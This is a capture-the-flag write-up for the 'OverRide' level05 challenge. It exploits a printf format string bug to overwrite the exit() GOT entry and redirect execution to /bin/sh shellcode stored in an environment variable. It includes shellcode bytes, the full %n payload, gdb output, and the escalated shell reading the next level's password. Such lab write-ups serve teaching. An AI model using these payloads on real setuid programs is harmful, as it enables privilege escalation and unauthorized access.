# Format string attack / overwrite GOT / ret2shellcode

```shell
┌──$ [~/42/2022/override]
└─>  ssh 192.168.56.101 -p 4242 -l level05
           ____                  ____  _     __   
          / __ \_   _____  _____/ __ \(_)___/ /__ 
         / / / / | / / _ \/ ___/ /_/ / / __  / _ \
        / /_/ /| |/ /  __/ /  / _, _/ / /_/ /  __/
        \____/ |___/\___/_/  /_/ |_/_/\__,_/\___/ 
                                          
                       Good luck & Have fun

   To start, ssh with level00/level00 on 192.168.56.101:4242
level05@192.168.56.101's password: 3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN

RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/users/level05/level05
```
Only one `main()` function is defined in the executable.
It gets users input, decapitalize and print, following by exit with status 0.

Even though the stack is executable, at the first glance shellcode can be placed in the buffer.

But the redirection of the flow to the stack will not work, as the program modify user input.
```shell
level05@OverRide:~$ readelf -a level05 | grep STACK
  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RWE 0x4
```
```
SHELLCODE = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
```
```
Breakpoint 1, 0x0804847a in main ()
gdb-peda$ x/25wx 0xffffd698
0xffffd698:     0x080497e0      0x080497e2      0x90909090      0x90909090
0xffffd6a8:     0x90909090      0x90909090   >>>0x6850c031<<<   0x68732f2f
0xffffd6b8:     0x69622f68   >>>0x50e3896e<<  >>0xb0e18953<<<   0x2580cd0b
0xffffd6c8:     0x39383435      0x31257837      0x256e2430      0x39353031
0xffffd6d8:     0x31257831      0x906e2431      0x90909090      0x90909090
0xffffd6e8:     0x90909090      0x90909090      0x90909090      0x90909090
0xffffd6f8:     0x00909090
gdb-peda$ x/25wx 0xffffd698
gdb-peda$ continue
Breakpoint 2, 0x08048513 in main ()
gdb-peda$ x/25wx 0xffffd698
0xffffd698:     0x080497e0      0x080497e2      0x90909090      0x90909090
0xffffd6a8:     0x90909090      0x90909090   >>>0x6870c031<<<   0x68732f2f
0xffffd6b8:     0x69622f68   >>>0x70e3896e<<  >>0xb0e18973<<<   0x2580cd0b
0xffffd6c8:     0x39383435      0x31257837      0x256e2430      0x39353031
0xffffd6d8:     0x31257831      0x906e2431      0x90909090      0x90909090
0xffffd6e8:     0x90909090      0x90909090      0x90909090      0x90909090
0xffffd6f8:     0x00909090
```

The issue is that `printf()` is missuded which expose the application to the Format String Attack.

FSA allows to apply overwrite of GOT table where address of `exit()` is stored.

Determine addresses of `system()` and `"/bin/sh"` as well as where `exit()` is stored.
```
gdb-peda$ print system
$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
gdb-peda$
gdb-peda$ find "/bin/sh"
Searching for '/bin/sh' in: None ranges
Found 1 results, display max 1 items:
libc : 0xf7f897ec ("/bin/sh")
gdb-peda$
gdb-peda$ x/i main+207
  0x8048513 <main+207>: call 0x8048370 <exit@plt>
gdb-peda$ disassemble 0x8048370
Dump of assembler code for function exit@plt:
  0x08048370 <+0>:  jmp  DWORD PTR ds:0x80497e0
  0x08048376 <+6>:  push 0x18
  0x0804837b <+11>: jmp  0x8048330
End of assembler dump.
gdb-peda$ x 0x80497e0
  0x80497e0 <exit@got.plt>: 0x08048376
```

Input recognizable characters to determine how far away input is layed on the stack.

> Note that due to XOR operation upercase character will be inverted, A(41) will be a(61).

```shell
level05@OverRide:~$ python -c 'print("AAAABBBB" + "%x "*11)' | ./level05
aaaabbbb00000064 f7fcfac0 f7ec3add ffffd6df ffffd6de 00000000 ffffffff ffffd764 f7fdb000 61616161 62626262
```
Input string starts with offset 10.
```
        [1]      [2]      [3]      [4]      [5]      [6]      [7]      [8]      [9]      [10]     [11]
aaaabbbb00000064 f7fcfac0 f7ec3add ffffd6df ffffd6de 00000000 ffffffff ffffd764 f7fdb000 61616161 62626262
```

Export [shellcode](http://shell-storm.org/shellcode/files/shellcode-811.php) into environment variables and  retrieve the address where it is lay.

Devide the address per byte  and calculate for each number of characters that need to be printen by `%x` and written by `%n`.
```
0xffffdedb
0xdb -> 0x0db-16 = 203
0xde -> 0x1de-16-203 = 259
0xff -> 0x1ff-16-259-203 = 33
0xff -> 0x2ff-16-259-203-33 = 256
```

## Exploit
```shell
level05@OverRide:~$ export SHELL_CODE=$(python -c "print '\x90'*100 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'")
level05@OverRide:~$ ./getenv SHELL_CODE
SHELL_CODE at 0xffffdedb
level05@OverRide:~$ (python -c 'import struct; print(struct.pack("I", 0x080497e0) + struct.pack("I", 0x080497e1) + struct.pack("I", 0x080497e2) + struct.pack("I", 0x080497e3) + "%203x%10$n" + "%259x%11$n" + "%33x%12$n" + "%256x%13$n")'; echo 'id; cat /home/users/$(whoami)/.pass') | ./level05
                                                                                                                                                                                                         64                                                                                                                                                                                                                                                           f7fcfac0                         f7ec3af9                                                                                                                                                                                                                                                        ffffd65f
uid=1005(level05) gid=1005(level05) euid=1006(level06) egid=100(users) groups=1006(level06),100(users),1005(level05)
h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
```

## Addendum
```c
#include <stdio.h>
#include <stdlib.h>

int main(int ac, char *av[])
{
  printf("%s at %p\n", av[1], getenv(av[1]));
}
```
